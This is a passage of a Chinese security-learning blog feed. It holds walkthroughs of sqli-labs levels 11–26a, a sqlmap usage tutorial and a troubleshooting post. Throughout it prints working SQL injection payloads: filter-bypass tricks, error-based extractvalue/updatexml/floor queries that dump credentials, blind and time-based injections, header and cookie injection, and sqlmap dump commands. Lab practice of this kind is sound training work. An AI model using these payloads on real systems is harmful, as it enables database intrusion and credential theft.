title="Less-25(绕过注入)"></a>Less-25(绕过注入)</h1><p>正常登录后，开始测试，加上单引号，报错，注释掉回显正常，故为单引号注入，接下来<code>orser by 3 --+</code></p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/4.jpg" alt="4"></p><p>发现回显不正常，hint提示我们语句中的or两个字母没有了,查一下源代码：</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/5.jpg" alt="5"></p><p>or 和and被注释掉了。</p><h2 id="法一：双写的联合查询"><a href="#法一：双写的联合查询" class="headerlink" title="法一：双写的联合查询"></a>法一：双写的联合查询</h2><p>使用双写的方法，把or和and的每一个字母之间，使用or或and分隔开即可:</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/6.jpg" alt="6"></p><p>后续和第一关一样，在遇到or和and时要双写。如下需对password进行双写<code>?id=-1&#39; union select 1,(select group_concat(concat_ws(&#39;-&#39;,id,username,passwoorrd)) from users),3-- #</code>:</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/7.jpg" alt="7"></p><h2 id="法二：报错注入or-gt"><a href="#法二：报错注入or-gt" class="headerlink" title="法二：报错注入or-&gt;||"></a>法二：报错注入<code>or-&gt;||</code></h2><p><code>?id=1&#39; || extractvalue(1,concat(0x7e,database()))--+</code></p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/8.jpg" alt="8"></p><p>发现or可以用||代替而and用&amp;&amp;代替报错。原因是&amp;&amp;进行url编码，变成了%26%26：</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/9.jpg" alt="9"></p><h1 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h1><p>本关可以正常union注入也可以用Bool或Time盲注，但不能报错注入：<img src="/2020/12/09/sqli-labs%E4%BA%94/10.jpg" alt="10"></p><p>源代码中将报错注释掉了。</p><p>试探一番发现为数字型输入，其余步骤与25关相似。</p><h1 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h1><p>单引号报错，将其注释后仍报错，发现注释符消失</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/11.jpg" alt="11"></p><p>查看源代码:</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/12.jpg" alt="12"></p><p>发现一堆符号被注释了，所以要像给or找个替代符号一样，给其他的被转义的符号找个替代：</p><ul><li><p><code>;%00</code>注释符</p></li><li><p><code>%0a</code> 新建一行</p></li><li><p><code>%0b</code> TAB 键（垂直）</p></li><li><p><code>%0c</code> 新的一页</p></li><li><p><code>%0d</code> return 功能</p></li><li><p><code>%a0</code> 空格</p></li><li><p><code>%09</code> TAB 键（水平）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%23(#)&#96;、&#96;%2a(*)&#96;、&#96;%2d(-)&#96;、&#96;%2f(&#x2F;)&#96;、&#96;%5c(\)</span><br></pre></td></tr></table></figure></li></ul><p>有三种注入方式：</p><ul><li><p>因正确回显非固定字符串，可利用以上特殊 URL 编码代替空格，仍使用<code>union</code>加空格连接<code>select</code>联合注入。</p><p>将单引号注释掉:<code>?id=0%27%a0||%a0%271%27=%271</code></p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/20.jpg" alt="20"></p><p>回显正常，故为单引号注入</p><p><code>?id=0&#39;%a0union%a0select%a02,database(),4%a0||%a0&#39;1&#39;=&#39;1</code></p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/19.jpg" alt="19"></p><p>接下去和之前类似，注意字符转换。</p></li><li><p>updatexml()与extractvalue()报错注入</p><p><code>?id=0&#39;||updatexml(1,concat(&#39;$&#39;,(database())),0)||&#39;1&#39;=&#39;1</code></p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/21.jpg" alt="21"></p><p>接下去同理。</p></li><li><p>Bool 盲注，构造注入语句避开空格。</p></li></ul><h1 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h1><p><code>?id=1&#39;</code>无回显，双引号回显正常查看源代码：</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/22.jpg" alt="22"></p><p>图中48行将报错注释掉，故此关不能使用报错注入，or,and等符号一样被注释掉了。将单引号注释掉仍无回显，用<code>?id=1&#39;)||&#39;1&#39;=(&#39;1</code>进行注释回显正常故为‘）闭合型注入。</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/23.jpg" alt="23"></p><p>其余步骤与26关类似<strong>但不可用报错注入</strong>。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>less-24登录报错解决方法</title>
    <link href="/2020/12/06/24/"/>
    <url>/2020/12/06/24/</url>
    
    <content type="html"><![CDATA[<p>十二月一号的时候打靶场打到第24关，按正常步骤先进行注册后页面如下：</p><p><img src="/2020/12/06/24/2.jpg" alt="2"></p><p>无法跳转到初始登录页面，且出现警告，然后我以为这只是正常警告就手动点击home键返回</p><p>用刚注册的账号登录出现如下页面:</p><p><img src="/2020/12/06/24/1.jpg" alt="1"></p><p>无法正常登录，然后我根据警告内容查看了login.php文件，查不出什么错误。之后就去百度，搜到两种解法，第一种是logged-in文件有错误，我重新下了sqli-labs的压缩包替换，结果一样……第二种是修改php.ini文件里的output_buffering = Off，将Off改为On；将session.auto_start = 0 改为session.auto_start = 1 。改完后需要重启apache，我按照这个方法改了如下文件里的配置</p><p><img src="/2020/12/06/24/3.jpg" alt="3"></p><p>发现还是不行，依旧是那个页面，然后我就卡在24关到今天，卡了快一周…….</p><p>就在今天，我发现了另一个文件:</p><p><img src="/2020/12/06/24/4.jpg" alt="4"></p><p>这个文件的类型为设置配置！！！我改了这个文件的相关参数，再次登录发现成功登录了!!</p><p><img src="/2020/12/06/24/17.jpg" alt="17"></p><p>所以只需在此文件里改信息…….因为登录问题卡了快一周的东西就这么解决了。。</p><p>至于为什么这么做查到的解释是：用txt文件编辑过function.php、wp-login.php、pluggable.php 这三个PHP文件导致UTF8编码和BOM冲突，UTF8文件的BOM（Byte Order Mark)标志，在保存的时候会自动存入！</p><p>然后问题就解决了~~</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqlmap</title>
    <link href="/2020/12/01/sqlmap/"/>
    <url>/2020/12/01/sqlmap/</url>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>sqlmap终于终于搭好了，之前的python环境没搭好，下了好多次换过2.X和3.X，设置环境变量的时候还不小心将path变量删了导致博客崩了……之后sqlmap解压错根目录了…终于把sqlmap搭好了想打靶场，发现还需要有抓包工具，于是又去搭java环境,下Burp Suite。现在终于可以了!!!</p><h1 id="Sqlmap简介"><a href="#Sqlmap简介" class="headerlink" title="Sqlmap简介"></a>Sqlmap简介</h1><p>五种注入模式：布尔盲注，时间盲注，报错注入，联合查询，堆查询</p><p>支持的数据库：MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB</p><p>七种等级:</p><ul><li>0 只显示python错误以及严重的信息。</li><li>1 同时显示基本信息和警告信息。（默认）</li><li>2 同时显示debug信息。</li><li>3 同时显示洼入的payload</li><li>4 同时显示HTTP请求</li><li>5 同时显示HTTP响应头</li><li>6 同时显示HTTP响应页面。</li></ul><p>常用命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">-a, --all&#x2F;&#x2F;获取所有信息</span><br><span class="line"></span><br><span class="line">-b, --banner&#x2F;&#x2F;获取数据库管理系统的标识</span><br><span class="line"></span><br><span class="line">--current-user&#x2F;&#x2F;获取数据库管理系统当前用户</span><br><span class="line"></span><br><span class="line">--current-db&#x2F;&#x2F;获取数据库管理系统当前数据库</span><br><span class="line"></span><br><span class="line">--hostname&#x2F;&#x2F;获取数据库服务器的主机名称</span><br><span class="line"></span><br><span class="line">--is-dba&#x2F;&#x2F;检测DBMS当前用户是否DBA</span><br><span class="line"></span><br><span class="line">--users&#x2F;&#x2F;枚举数据库管理系统用户</span><br><span class="line"></span><br><span class="line">--passwords&#x2F;&#x2F;枚举数据库管理系统用户密码哈希</span><br><span class="line"></span><br><span class="line">--privileges&#x2F;&#x2F;枚举数据库管理系统用户的权限</span><br><span class="line"></span><br><span class="line">--roles&#x2F;&#x2F;枚举数据库管理系统用户的角色</span><br><span class="line"></span><br><span class="line">--dbs&#x2F;&#x2F;枚举数据库管理系统数据库</span><br><span class="line"></span><br><span class="line">--tables&#x2F;&#x2F;枚举的DBMS数据库中的表</span><br><span class="line"></span><br><span class="line">--columns&#x2F;&#x2F;枚举DBMS数据库表列</span><br><span class="line"></span><br><span class="line">--schema&#x2F;&#x2F;枚举数据库架构</span><br><span class="line"></span><br><span class="line">--count&#x2F;&#x2F;检索表的项目数，获取表中的数据个数:sqlmap.py -u url --count -D testdb</span><br><span class="line"></span><br><span class="line">--dump&#x2F;&#x2F;转储数据库表项</span><br><span class="line"></span><br><span class="line">--dump-all&#x2F;&#x2F;转储数据库所有表项</span><br><span class="line"></span><br><span class="line">--search&#x2F;&#x2F;搜索列（S），表（S）和&#x2F;或数据库名称（S）</span><br><span class="line"></span><br><span class="line">--comments&#x2F;&#x2F;获取DBMS注释</span><br><span class="line"></span><br><span class="line">-D DB&#x2F;&#x2F;要进行枚举的指定数据库名</span><br><span class="line"></span><br><span class="line">-T TBL&#x2F;&#x2F;DBMS数据库表枚举</span><br><span class="line"></span><br><span class="line">-C COL&#x2F;&#x2F;DBMS数据库表列枚举</span><br><span class="line"></span><br><span class="line">-X EXCLUDECOL&#x2F;&#x2F;DBMS数据库表不进行枚举</span><br><span class="line"></span><br><span class="line">-U USER&#x2F;&#x2F;用来进行枚举的数据库用户</span><br><span class="line"></span><br><span class="line">--exclude-sysdbs&#x2F;&#x2F;枚举表时排除系统数据库</span><br><span class="line"></span><br><span class="line">--start&#x3D;LIMITSTART&#x2F;&#x2F;获取第一个查询输出数据位置</span><br><span class="line"></span><br><span class="line">--stop&#x3D;LIMITSTOP&#x2F;&#x2F;获取最后查询的输出数据</span><br><span class="line"></span><br><span class="line">--first&#x3D;FIRSTCHAR&#x2F;&#x2F;第一个查询输出字的字符获取</span><br><span class="line"></span><br><span class="line">--last&#x3D;LASTCHAR&#x2F;&#x2F;最后查询的输出字字符获取</span><br><span class="line"></span><br><span class="line">--sql-query&#x3D;QUERY&#x2F;&#x2F;要执行的SQL语句</span><br><span class="line"></span><br><span class="line">--sql-shell&#x2F;&#x2F;提示交互式SQL的shell</span><br><span class="line"></span><br><span class="line">--sql-file&#x3D;SQLFILE&#x2F;&#x2F;要执行的SQL文件</span><br></pre></td></tr></table></figure><p>技术分类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">–technique：</span><br><span class="line">B：布尔盲注</span><br><span class="line">E：报错</span><br><span class="line">U：联合</span><br><span class="line">S：堆叠</span><br><span class="line">T：时间</span><br><span class="line">Q：内联查询</span><br></pre></td></tr></table></figure><h1 id="GET型"><a href="#GET型" class="headerlink" title="GET型"></a>GET型</h1><h4 id="1-先测试是否存在注入"><a href="#1-先测试是否存在注入" class="headerlink" title="1.先测试是否存在注入"></a>1.先测试是否存在注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;Less-1&#x2F;?id&#x3D;1&quot;</span><br></pre></td></tr></table></figure><p><img src="/2020/12/01/sqlmap/1.jpg" alt="1"></p><p>红框框中语句表明存在注入，有时候也可能不存在SQL注入。逐个测试会挺麻烦的可以批量检测，将目标url整理为txt文件，当文件保存为hhh.txt时使用“sqlmap.py-m hhh.txt”，注意<strong>hhh.txt跟sqlmap在同一个目录下</strong></p><h4 id="2-查库"><a href="#2-查库" class="headerlink" title="2.查库"></a>2.查库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --dbs --batch</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u [“url”] --current-db&#x2F;&#x2F;列出当前数据库</span><br></pre></td></tr></table></figure><p><code>dbs</code>表示列出说有数据库，batch可以自动选择，也可以省略，但省略后就需要手动选择<img src="/2020/12/01/sqlmap/2.jpg" alt="2"></p><h4 id="3-查表"><a href="#3-查表" class="headerlink" title="3.查表"></a>3.查表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u [“url”] -D [‘数据库名’] --tables --batch</span><br></pre></td></tr></table></figure><p><img src="/2020/12/01/sqlmap/3.jpg" alt="3"></p><h4 id="4-查列"><a href="#4-查列" class="headerlink" title="4.查列"></a>4.查列</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u [“url”] -D [‘数据库名’] -T[‘表名’] --columns --batch</span><br></pre></td></tr></table></figure><p><img src="/2020/12/01/sqlmap/4.jpg" alt="4"></p><h4 id="5-爆值"><a href="#5-爆值" class="headerlink" title="5.爆值"></a>5.爆值</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u [“url”] -D [‘数据库名’] -T [‘表名’] -C [‘字段名1,字段名2,…’] --dump --batch</span><br></pre></td></tr></table></figure><p><img src="/2020/12/01/sqlmap/5.jpg" alt="5"></p><p>关与关之间需要清除sqlmap缓存：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py --purge</span><br></pre></td></tr></table></figure><h1 id="Post型"><a href="#Post型" class="headerlink" title="Post型"></a>Post型</h1><p>先用burp suite抓个包，保存到文件里</p><p><img src="/2020/12/01/sqlmap/6.jpg" alt="6"></p><p>执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r &quot;C:\Users\32270\Desktop\hhh.txt&quot; --leve&#x3D;5 --risk&#x3D;3 --dbs</span><br></pre></td></tr></table></figure><p><img src="/2020/12/01/sqlmap/7.jpg" alt="7"></p><p>查表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r &quot;C:\Users\32270\Desktop\hhh.txt &quot; -D security --tables --batch</span><br></pre></td></tr></table></figure><p><img src="/2020/12/01/sqlmap/8.jpg" alt="8"></p><p>接下去跟get型一样。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labs（四）</title>
    <link href="/2020/11/26/sqli-labs%E5%9B%9B/"/>
    <url>/2020/11/26/sqli-labs%E5%9B%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h1><p>基于错误的用户代理，头部POST注入.</p><p>补充几个请求头：</p><blockquote><ul><li><code>Host</code><br> Host请求报头域主要用于指定被请求资源的Internet主机和端口号。</li><li><code>User-Agent</code><br> User-Agent请求报头域允许客户端将它的操作系统、浏览器和其他属性告诉服务器。</li><li><code>Referer</code><br> Referer包含一个URL，代表当前访问URL的上一个URL。</li><li><code>Cookie</code><br> Cookie是非常重要的请求头，它是一段文本，常用来表示请求者身份等。</li><li><code>Range</code><br> Range可以请求实体的部分内容。</li><li><code>X-Forwarded-For</code><br> X-Forwarded-For即XXF头，它代表请求端的IP，可以有多个，中间以逗号隔开。</li><li><code>Accept</code><br> Accept请求报头域用于指定客户端接收哪些<a href="https://www.cnblogs.com/tjudzj/p/6528008.html">MIME类型</a>的信息。</li><li><code>Accept-Charset</code><br> Accept-Charset请求报头域用于指定客户端接收的字符集。如果在请求消息中没有设置这个域，默认是任何字符集都可以接收。</li></ul></blockquote><h4 id="查找注入点"><a href="#查找注入点" class="headerlink" title="查找注入点"></a>查找注入点</h4><p>在用户名和密码注入都只回显最初的ip地址，查找源代码</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/1.jpg" alt="1"></p><p>本关对用户名和密码做了check_input()处理，故无法注入。但在用admin登录成功时发现页面有user agent 信息猜测可在其注入，但由于这里执行的语句是insert,所以不能像之前一样用#将后面的语句给注释掉。当#注释掉后面就无法正常插入执行 SQL语句。</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/2.jpg" alt="2"></p><p>查找源代码验证了猜测</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/3.jpg" alt="3"></p><p>注意:这里要输入正确的账号和密码才能绕过账号密码判断，进入处理<code>User-Agent</code>部分。<strong>17关对密码进行了更改,故此处记得用新密码，或者在靶场初页面重置，否则无法登录</strong>，本人用admin登录了半天登不进去，后来才反应过来17关改密码了…………</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/4.jpg" alt="4"></p><h3 id="（一）hackbar插件"><a href="#（一）hackbar插件" class="headerlink" title="（一）hackbar插件:"></a>（一）hackbar插件:</h3><h3 id="extractvalue（）"><a href="#extractvalue（）" class="headerlink" title="extractvalue（）"></a>extractvalue（）</h3><h4 id="1-试探"><a href="#1-试探" class="headerlink" title="1.试探"></a>1.试探</h4><p>先试单引号</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/7.jpg" alt="7"></p><p>报错，再闭合，回显正常</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/6.jpg" alt="6"></p><p>查看源代码确定为单引号注入。</p><h4 id="2-爆库"><a href="#2-爆库" class="headerlink" title="2.爆库"></a>2.爆库</h4><p><code>&#39; or extractvalue(1,concat(0x7e,(select database()),0x7e)) or &#39;1&#39;=&#39;1</code></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/5.jpg" alt="5"></p><h4 id="3-爆表"><a href="#3-爆表" class="headerlink" title="3.爆表"></a>3.爆表</h4><p><code>&#39; or extractvalue(1,concat(0x7e,(select group_concat(table_name) from  information_schema.tables and table_schema=database()))) or &#39;1&#39;=&#39;1</code><img src="/2020/11/26/sqli-labs%E5%9B%9B/8.jpg" alt="8"></p><h4 id="4-爆列"><a href="#4-爆列" class="headerlink" title="4.爆列"></a>4.爆列</h4><p><code>&#39; or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39;)))  or &#39;1&#39;=&#39;1</code></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/9.jpg" alt="9"></p><h4 id="5-爆值"><a href="#5-爆值" class="headerlink" title="5.爆值"></a>5.爆值</h4><p><code>&#39; or extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)))  or&#39;1&#39;=&#39;1 </code><img src="/2020/11/26/sqli-labs%E5%9B%9B/10.jpg" alt="10"></p><p>遇到之前的老问题数据显示不全，可用limit0,1;来遍历或者使用not in()：</p><p><code>&#39; or extractvalue(1,concat(0x7e,(select  group_concat(username,0x3a,password) from users where username not in  (&#39;Dumb&#39;,&#39;Angelinal&#39;)))) or &#39; </code></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/11.jpg" alt="11"></p><p>不过这种方法也很麻烦。</p><p>updatexml()类似。</p><h3 id="floor"><a href="#floor" class="headerlink" title="floor():"></a>floor():</h3><p><code>&#39; and (select 1 from (select  count(*),concat_ws(&#39;-&#39;,(select user()),floor(rand()*2))as a from  information_schema.tables group by a) b)  and &#39;</code></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/12.jpg" alt="12"></p><p>也可使用时间盲注。</p><h3 id="二-HTTP-Header-Live"><a href="#二-HTTP-Header-Live" class="headerlink" title="(二)HTTP Header Live"></a>(二)HTTP Header Live</h3><p>HTTP Header Live是Firefox中的插件，可在其中对user-agent 进行修改。</p><h3 id><a href="#" class="headerlink" title></a><img src="/2020/11/26/sqli-labs%E5%9B%9B/13.jpg" alt="13"></h3><h3 id="（三）Live-HTTP-headers"><a href="#（三）Live-HTTP-headers" class="headerlink" title="（三）Live HTTP headers"></a>（三）Live HTTP headers</h3><p>Live HTTP headers也是Firefox里的插件，但是需要安装低版本火狐，测试安装的是45.0版本浏览器。这篇博客有详细教程：<a href="https://blog.csdn.net/qq_22146195/article/details/103537148">火狐浏览器安装Live HTTP headers步骤记录</a></p><h3 id="四-Burp-Suite"><a href="#四-Burp-Suite" class="headerlink" title="(四)Burp Suite"></a>(四)Burp Suite</h3><p>Burp Suite 是用于攻击web 应用程序的集成平台，包含许多工具,且这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。<strong>安装burp suite需要java环境</strong></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/14.jpg" alt="14"></p><p>类似工具还有很多不一一列举。</p><h1 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h1><p>基于头部的Referer POST报错注入</p><p>成功登陆后会显示referer地址,用户名与18关一样用函数进行处理，故在referer注入。与18关类似。</p><p>仍可用HTTP Header Live：</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/15.jpg" alt="15"></p><p>Burp Suite：</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/16.jpg" alt="16"></p><h1 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h1><p>基于错误的cookie头部POST注入</p><p>从源代码中我们可以看到cookie从username获得值之后，当再次刷新时会从cookie中获取username,然后进行查询。</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/18.jpg" alt="18"></p><p>因为此关为post注入，可使用union联合语句，报错语句。</p><h2 id="法一：union联合语句"><a href="#法一：union联合语句" class="headerlink" title="法一：union联合语句"></a>法一：union联合语句</h2><h4 id="1-试探-1"><a href="#1-试探-1" class="headerlink" title="1.试探"></a>1.试探</h4><p>从上图源代码中可以看出本关为单引号注入，也可以试探一下：</p><p>单引号报错</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/19.jpg" alt="19"></p><p>注释掉回显正常</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/20.jpg" alt="20"></p><h4 id="2-判断字段数与回显字段"><a href="#2-判断字段数与回显字段" class="headerlink" title="2.判断字段数与回显字段"></a>2.判断字段数与回显字段</h4><p>使用burp suite抓个包：</p><p><code>uname=admin&#39; order by 4 -- #</code></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/21.jpg" alt="21"></p><p>4报错，3回显正常。其实和第一关如出一辙。</p><p><code>uname=1&#39; union select 1,2,3 -- #</code></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/22.jpg" alt="22"></p><p>之后就是查库，查表，查列，查值……不再赘述。</p><h2 id="法二：floor"><a href="#法二：floor" class="headerlink" title="法二：floor()"></a>法二：floor()</h2><p><code>uname=1&#39; or (select 1 from (select 1,count(*),concat_ws(&#39;-&#39;,(select database()),floor(rand()*2))as a from information_schema.tables group by a) b)-- #</code></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/23.jpg" alt="23"></p><h2 id="法三：updatexml-注入，extractvalue-注入"><a href="#法三：updatexml-注入，extractvalue-注入" class="headerlink" title="法三：updatexml()注入，extractvalue()注入"></a>法三：updatexml()注入，extractvalue()注入</h2><p><code>uname=1&#39; or updatexml(1,concat(0x7e,(select group_concat(table_name)  from information_schema.tables where table_schema=database()),0x7e),0)-- #</code></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/24.jpg" alt="24"></p><h2 id="法四：布尔盲注"><a href="#法四：布尔盲注" class="headerlink" title="法四：布尔盲注"></a>法四：布尔盲注</h2><p><code>uname=admin&#39; and left((select database()),8)=&#39;security&#39;-- #</code></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/27.jpg" alt="27"></p><p>报错时页面：</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/26.jpg" alt="26"></p><h2 id="法五：延时注入"><a href="#法五：延时注入" class="headerlink" title="法五：延时注入"></a>法五：延时注入</h2><p><code>uname=admin&#39; and if(length(database())=8,1,sleep(5))-- #</code><img src="/2020/11/26/sqli-labs%E5%9B%9B/28.jpg" alt="28"></p><p>用burp suite 抓包报错会一直延时，hackbar正常延时，报错页面如下：</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/29.jpg" alt="29"></p><h1 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h1><p>基于base64编码单引号和括号的Cookie注入</p><p>本关和Less-20相似，cookie从username获得值之后，再次刷新时会从cookie中获取username,再进行查询,只是cookie的uname值需经过base64编码。</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/32.jpg" alt="32"></p><p>推荐一个编码器<a href="https://base64.us/">Base64 在线编码解码</a>，admin的编码为YWRtaW4=</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/31.jpg" alt="31"></p><p>单引号报错：</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/33.jpg" alt="33"></p><p><code>&#39;)</code>也报错，用#注释后回显正常。其余操作与20关相同，将命令编码即可。</p><h1 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h1><p>登录成功后显示的是21关的图片，应该是作者弄错了。</p><p>双引号报错</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/34.jpg" alt="34"></p><p>注释后回显正常</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/35.jpg" alt="35"></p><p>接下去就跟21类似。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labs(三)</title>
    <link href="/2020/11/22/sqli-labs%E4%B8%89/"/>
    <url>/2020/11/22/sqli-labs%E4%B8%89/</url>
    
    <content type="html"><![CDATA[<h1 id="sqli-labs-三"><a href="#sqli-labs-三" class="headerlink" title="sqli-labs(三)"></a>sqli-labs(三)</h1><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><p>less-11为post注入，post就是数据从客户端提交到服务器端,输入用户名和密码会以表单的形式提交到服务器进行验证。</p><h4 id="1-试探"><a href="#1-试探" class="headerlink" title="1.试探"></a>1.试探</h4><p>用之前的1无反应，试着使用常用的管理员密码账户 admin(Dumb也行)，成功登录；加单引号注入，密码随意，报错。</p><p><img src="/2020/11/22/sqli-labs%E4%B8%89/1.jpg" alt="1"></p><p>根据报错可以判断出该处为单引号注入，使用万能密码<code>admin&#39;or&#39;1&#39;=&#39;1#</code>（or ‘1’=’1恒成立，所以语句恒真）将其注释；回显正常，确定为单引号注入。</p><h4 id="2-爆库名"><a href="#2-爆库名" class="headerlink" title="2.爆库名"></a>2.爆库名</h4><p>用<code>union select 1,database()-- #</code>查询，语句放在用户名或密码都可以。</p><p><img src="/2020/11/22/sqli-labs%E4%B8%89/2.jpg" alt="2"></p><h4 id="3-爆表"><a href="#3-爆表" class="headerlink" title="3.爆表"></a>3.爆表</h4><p>接下来步骤与前面关卡类似</p><p><img src="/2020/11/22/sqli-labs%E4%B8%89/3.jpg" alt="3"></p><h4 id="4-爆字段"><a href="#4-爆字段" class="headerlink" title="4.爆字段"></a>4.爆字段<img src="/2020/11/22/sqli-labs%E4%B8%89/4.jpg" alt="4"></h4><h4 id="5-爆值"><a href="#5-爆值" class="headerlink" title="5.爆值"></a>5.爆值<img src="/2020/11/22/sqli-labs%E4%B8%89/5.jpg" alt="5"></h4><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>试探出该处为双引号闭合注入，其余步骤类似。</p><h2 id><a href="#" class="headerlink" title></a><img src="/2020/11/22/sqli-labs%E4%B8%89/6.jpg" alt="6"></h2><h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><h4 id="1-试探-1"><a href="#1-试探-1" class="headerlink" title="1.试探"></a>1.试探<img src="/2020/11/22/sqli-labs%E4%B8%89/7.jpg" 